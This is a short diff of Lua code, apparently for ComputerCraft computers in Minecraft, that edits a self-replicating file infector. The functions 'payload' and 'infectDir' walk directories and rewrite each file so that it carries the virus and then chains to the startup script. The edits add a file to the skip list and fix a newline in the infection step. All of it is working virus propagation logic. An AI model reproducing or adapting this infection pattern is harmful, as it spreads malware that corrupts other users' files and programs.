@@ -42,7 +42,7 @@ function payload()
     end
 end
 
-ignoredFiles = {".temp", ".ignoreme", "apis", "openp", "disk", "shell"}
+ignoredFiles = {".temp", ".ignoreme", "apis", "openp", "disk", "shell", "escapeCSV"}
    
 function infectDir(dirName, payload)
   fileList = fs.list(dirName)
@@ -68,7 +68,7 @@ function infectDir(dirName, payload)
           dump = dump .. escape.readAll() .. "\n"
           escape.close()
 		  dump = dump .. 'shell.run("' .. fullFile .. '" .. escapeCSV(args))\n'
-          dump = dump .. 'shell.run("/startup")'
+          dump = dump .. 'shell.run("/startup")\n'
         else
           dump = payload
         end
